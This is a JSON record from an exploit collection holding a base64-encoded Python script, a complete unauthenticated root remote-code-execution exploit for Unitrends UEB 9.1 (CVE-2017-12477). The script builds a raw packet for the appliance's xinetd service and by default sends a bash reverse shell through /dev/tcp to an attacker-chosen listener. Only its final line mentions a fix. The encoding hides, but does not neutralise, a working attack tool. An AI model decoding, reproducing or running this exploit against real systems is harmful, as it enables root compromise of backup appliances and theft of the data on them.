{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBVbmF1dGhlbnRpY2F0ZWQgcm9vdCBSQ0UgZm9yIFVuaXRyZW5kcyBVRUIgOS4xDQojIERhdGU6IDA4LzA4LzIwMTcNCiMgRXhwbG9pdCBBdXRob3JzOiBKYXJlZCBBcmF2ZSwgQ2FsZSBTbWl0aCwgQmVubnkgSHVzdGVkDQojIENvbnRhY3Q6IGh0dHBzOi8vdHdpdHRlci5jb20vaW90ZW5udWkgfHwgaHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5ueUh1c3RlZCB8fCBodHRwczovL3R3aXR0ZXIuY29tLzB4QzQxMw0KIyBWZW5kb3IgSG9tZXBhZ2U6IGh0dHBzOi8vd3d3LnVuaXRyZW5kcy5jb20vDQojIFNvZnR3YXJlIExpbms6IGh0dHBzOi8vd3d3LnVuaXRyZW5kcy5jb20vZG93bmxvYWQvZW50ZXJwcmlzZS1iYWNrdXAtc29mdHdhcmUNCiMgVmVyc2lvbjogOS4xDQojIFRlc3RlZCBvbjogQ2VudE9TNg0KIyBDVkU6IENWRS0yMDE3LTEyNDc3DQoNCmltcG9ydCBzb2NrZXQNCmltcG9ydCBiaW5hc2NpaQ0KaW1wb3J0IHN0cnVjdA0KaW1wb3J0IHRpbWUNCmltcG9ydCBzeXMNCmZyb20gb3B0cGFyc2UgaW1wb3J0IE9wdGlvblBhcnNlcg0KDQpwcmludCAiIiINCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNClVuYXV0aGVudGljYXRlZCByb290IFJDRSBmb3IgVW5pdHJlbmRzIFVFQiA5LjENClRlc3RlZCBhZ2FpbnN0IGFwcGxpYW5jZSB2ZXJzaW9uczoNCiAgWytdIDkuMS4wLTIuMjAxNjExMzAyMTIwLkNlbnRPUzYNCg0KVGhpcyBleHBsb2l0IHVzZXMgcm91Z2hseSB0aGUgc2FtZSBwcm9jZXNzIHRvIGdhaW4gcm9vdCBleGVjdXRpb24NCmFzIGRvZXMgdGhlIGFwYWNoZSB1c2VyIG9uIHRoZSBVbml0cmVuZHMgYXBwbGlhbmNlLiBUaGUgcHJvY2VzcyBpcw0Kc29tZXRoaW5nIGxpa2UgdGhpczoNCg0KMS4gIENvbm5lY3QgdG8geGluZXRkIHByb2Nlc3MgKGl0J3MgdXN1YWxseSBydW5uaW5nIG9uIHBvcnQgMTc0MykNCjIuICBUaGlzIHByb2Nlc3Mgd2lsbCBzZW5kIHNvbWV0aGluZyBsaWtlOiAnP0EsQ29ubmVjdDM2MDkyJw0KMy4gIEluaXRpYXRlIGEgc2Vjb25kIGNvbm5lY3Rpb24gdG8gdGhlIHBvcnQgc3BlY2lmaWVkIA0KICAgIGluIHRoZSBwYWNrZXQgZnJvbSB4aW5ldGQgKDM2MDkyIGluIHRoaXMgZXhhbXBsZSkNCjQuICBzZW5kIGEgc3BlY2lhbGx5IGNyYWZ0ZWQgcGFja2V0IHRvIHhpbmV0ZCwgY29udGFpbmluZyB0aGUgDQogICAgY29tbWFuZCB0byBiZSBleGVjdXRlZCBhcyByb290DQo1LiAgUmVjZWl2ZSBjb21tYW5kIG91dHB1dCBmcm9tIHRoZSBjb25uZWN0aW9uIHRvIHBvcnQgMzYwOTINCjYuICBDbG9zZSBib3RoIGNvbm5lY3Rpb25zDQoNCk5COiBFdmVuIGlmIHlvdSBkb24ndCBzdHJpY3RseSBuZWVkIG91dHB1dCBmcm9tIHlvdXIgY29tbWFuZCwNClRoZSBzZWNvbmQgY29ubmVjdGlvbiBtdXN0IHN0aWxsIGJlIG1hZGUgZm9yIHRoZSBjb21tYW5kDQp0byBiZSBleGVjdXRlZCBhdCBhbGwuDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQoiIiINCg0KIyBQYXJzZSBjb21tYW5kIGxpbmUgYXJnczoNCnVzYWdlID0gIlVzYWdlOiAlcHJvZyAtciA8YXBwbGlhbmNlX2lwPiAtbCA8bGlzdGVuZXJfaXA+IC1wIDxsaXN0ZW5lcl9wb3J0PlxuIlwNCiAgICAgICIgICAgICAgJXByb2cgLXIgPGFwcGxpYW5jZV9pcD4gLWMgJ3RvdWNoIC90bXAvZm9vb29vb29vb29vbyciDQoNCnBhcnNlciA9IE9wdGlvblBhcnNlcih1c2FnZT11c2FnZSkNCnBhcnNlci5hZGRfb3B0aW9uKCItciIsICctLVJIT1NUJywgZGVzdD0ncmhvc3QnLCBhY3Rpb249InN0b3JlIiwNCiAgICAgICAgICBoZWxwPSJUYXJnZXQgaG9zdCB3LyBVTklUUkVORFMgVUVCIGluc3RhbGxhdGlvbiIpDQpwYXJzZXIuYWRkX29wdGlvbigiLWwiLCAnLS1MSE9TVCcsIGRlc3Q9J2xob3N0JywgYWN0aW9uPSJzdG9yZSIsDQogICAgICAgICAgaGVscD0iSG9zdCBsaXN0ZW5pbmcgZm9yIHJldmVyc2Ugc2hlbGwgY29ubmVjdGlvbiIpDQpwYXJzZXIuYWRkX29wdGlvbigiLXAiLCAnLS1MUE9SVCcsIGRlc3Q9J2xwb3J0JywgYWN0aW9uPSJzdG9yZSIsDQogICAgICAgICAgaGVscD0iUG9ydCBvbiB3aGljaCBuYyBpcyBsaXN0ZW5pbmciKQ0KcGFyc2VyLmFkZF9vcHRpb24oIi1jIiwgJy0tY21kJywgZGVzdD0nY21kJywgYWN0aW9uPSJzdG9yZSIsDQogICAgICAgICAgaGVscD0iUnVuIGEgY3VzdG9tIGNvbW1hbmQsIG5vIHJldmVyc2Ugc2hlbGwgZm9yIHlvdS4iKQ0KcGFyc2VyLmFkZF9vcHRpb24oIi14IiwgJy0teGluZXRkJywgZGVzdD0neGluZXRkJywgYWN0aW9uPSJzdG9yZSIsDQogICAgICAgICAgdHlwZT0iaW50IiwgZGVmYXVsdD0xNzQzLCAgIA0KICAgICAgICAgIGhlbHA9InBvcnQgb24gd2hpY2ggeGluZXRkIGlzIHJ1bm5pbmcgKGRlZmF1bHQ6IDE3NDMpIikNCg0KKG9wdGlvbnMsIGFyZ3MpID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQ0KDQppZiBvcHRpb25zLmNtZDoNCiAgaWYgKG9wdGlvbnMubGhvc3Qgb3Igb3B0aW9ucy5scG9ydCk6DQogICAgcGFyc2VyLmVycm9yKCJbIV0gT3B0aW9ucyAtLWNtZCBhbmQgWy0tTEhPU1R8fC0tTFBPUlRdIGFyZSBtdXR1YWxseSBleGNsdXNpdmUuXG4iKQ0KDQogIGVsaWYgbm90IG9wdGlvbnMucmhvc3Q6DQogICAgcGFyc2VyLmVycm9yKCJbIV0gTm8gcmVtb3RlIGhvc3Qgc3BlY2lmaWVkLlxuIikNCg0KZWxpZiBvcHRpb25zLnJob3N0IGlzIE5vbmUgb3Igb3B0aW9ucy5saG9zdCBpcyBOb25lIG9yIG9wdGlvbnMubHBvcnQgaXMgTm9uZToNCiAgcGFyc2VyLnByaW50X2hlbHAoKQ0KICBzeXMuZXhpdCgxKQ0KDQpSSE9TVCA9IG9wdGlvbnMucmhvc3QNCkxIT1NUID0gb3B0aW9ucy5saG9zdA0KTFBPUlQgPSBvcHRpb25zLmxwb3J0DQpYSU5FVERQT1JUID0gb3B0aW9ucy54aW5ldGQNCg0KaWYgb3B0aW9ucy5jbWQ6DQogIGNtZCA9IG9wdGlvbnMuY21kDQplbHNlOg0KICBjbWQgPSAnYmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjEgJicuZm9ybWF0KExIT1NULCBMUE9SVCkNCg0KZGVmIHJlY3ZfdGltZW91dCh0aGVfc29ja2V0LHRpbWVvdXQ9Mik6DQogICAgdGhlX3NvY2tldC5zZXRibG9ja2luZygwKQ0KICAgIHRvdGFsX2RhdGE9W107ZGF0YT0nJztiZWdpbj10aW1lLnRpbWUoKQ0KICAgIHdoaWxlIDE6DQogICAgICAgICNpZiB5b3UgZ290IHNvbWUgZGF0YSwgdGhlbiBicmVhayBhZnRlciB3YWl0IHNlYw0KICAgICAgICBpZiB0b3RhbF9kYXRhIGFuZCB0aW1lLnRpbWUoKS1iZWdpbj50aW1lb3V0Og0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgI2lmIHlvdSBnb3Qgbm8gZGF0YSBhdCBhbGwsIHdhaXQgYSBsaXR0bGUgbG9uZ2VyDQogICAgICAgIGVsaWYgdGltZS50aW1lKCktYmVnaW4+dGltZW91dCoyOg0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZGF0YT10aGVfc29ja2V0LnJlY3YoODE5MikNCiAgICAgICAgICAgIGlmIGRhdGE6DQogICAgICAgICAgICAgICAgdG90YWxfZGF0YS5hcHBlbmQoZGF0YSkNCiAgICAgICAgICAgICAgICBiZWdpbj10aW1lLnRpbWUoKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuMSkNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgcGFzcw0KICAgIHJldHVybiAnJy5qb2luKHRvdGFsX2RhdGEpDQoNCnByaW50ICJbK10gYXR0ZW1wdGluZyB0byBjb25uZWN0IHRvIHhpbmV0ZCBvbiB7MH06ezF9Ii5mb3JtYXQoUkhPU1QsIHN0cihYSU5FVERQT1JUKSkNCg0KdHJ5Og0KICBzMSA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCiAgczEuY29ubmVjdCgoUkhPU1QsWElORVREUE9SVCkpDQpleGNlcHQ6DQogIHByaW50ICJbIV0gRmFpbGVkIHRvIGNvbm5lY3QhIg0KICBleGl0KCkNCg0KZGF0YSA9IHMxLnJlY3YoNDA5NikNCmJwZF9wb3J0ID0gaW50KGRhdGFbLTg6LTNdKQ0KDQpwcmludCAiWytdIENvbm5lY3RlZCEgQ21kIG91dHB1dCB3aWxsIGNvbWUgYmFjayBvbiB7fTp7fSIuZm9ybWF0KFJIT1NULCBzdHIoYnBkX3BvcnQpKQ0KcHJpbnQgIlsrXSBDb25uZWN0aW5nIHRvIGJwZHNlcnZlcmQgb24ge306e30iLmZvcm1hdChSSE9TVCwgc3RyKGJwZF9wb3J0KSkNCg0KdHJ5Og0KICBzMiA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCiAgczIuY29ubmVjdCgoUkhPU1QsIGJwZF9wb3J0KSkNCmV4Y2VwdDoNCiAgcHJpbnQgIlshXSBGYWlsZWQgdG8gY29ubmVjdCEiDQogIHMxLmNsb3NlKCkNCiAgZXhpdCgpDQoNCnByaW50ICJbK10gQ29ubmVjdGVkISBTZW5kaW5nIHRoZSBmb2xsb3dpbmcgY21kIHRvIHswfTp7MX0iLmZvcm1hdChSSE9TVCxzdHIoWElORVREUE9SVCkpDQpwcmludCAiWytdICd7MH0nIi5mb3JtYXQoY21kKQ0KDQppZiAobGVuKGNtZCkgPiAyNDApOg0KICBwcmludCAiWyFdIFRoaXMgY29tbWFuZCBpcyBsb25nOyB0aGlzIG1pZ2h0IG5vdCB3b3JrLiINCiAgcHJpbnQgIlshXSBNYXliZSB0cnkgYSBzaG9ydGVyIGNvbW1hbmQuLi4iDQoNCmNtZF9sZW4gPSBjaHIobGVuKGNtZCkgKyAzKQ0KcGFja2V0X2xlbiA9IGNocihsZW4oY21kKSArIDIzKQ0KDQpwYWNrZXQgPSAnXHhhNVx4NTJceDAwXHgyZCcNCnBhY2tldCArPSAnXHgwMCcgKiAzDQpwYWNrZXQgKz0gcGFja2V0X2xlbg0KcGFja2V0ICs9ICdceDAwJyAqIDMNCnBhY2tldCArPSAnXHgwMScNCnBhY2tldCArPSAnXHgwMCcgKiAzDQpwYWNrZXQgKz0gJ1x4NGMnDQpwYWNrZXQgKz0gJ1x4MDAnICogMw0KcGFja2V0ICs9IGNtZF9sZW4NCnBhY2tldCArPSBjbWQNCnBhY2tldCArPSAnXHgwMCcgKiAzDQoNCnMxLnNlbmQocGFja2V0KQ0KDQpwcmludCAiWytdIGNtZCBwYWNrZXQgc2VudCEiDQpwcmludCAiWytdIFdhaXRpbmcgZm9yIHJlc3BvbnNlIGZyb20gezB9OnsxfSIuZm9ybWF0KFJIT1NULHN0cihicGRfcG9ydCkpDQoNCmRhdGEgPSByZWN2X3RpbWVvdXQoczIpDQoNCnByaW50ICJbK10gSGVyZSdzIHRoZSBvdXRwdXQgLT4gXG5cbiINCg0KcHJpbnQgZGF0YQ0KDQpwcmludCAiWytdIENsb3NpbmcgcG9ydHMsIGV4aXRpbmcuLi4uIg0KDQpzMS5jbG9zZSgpDQpzMi5jbG9zZSgpDQoNCiMgMy4gU29sdXRpb246DQojIFVwZGF0ZSB0byBVbml0cmVuZHMgVUVCIDEwDQo=", 
    "filename": "platforms/linux/remote/42957.py", 
    "id": "42957", 
    "cves": [
        "CVE-2017-12477"
    ]
}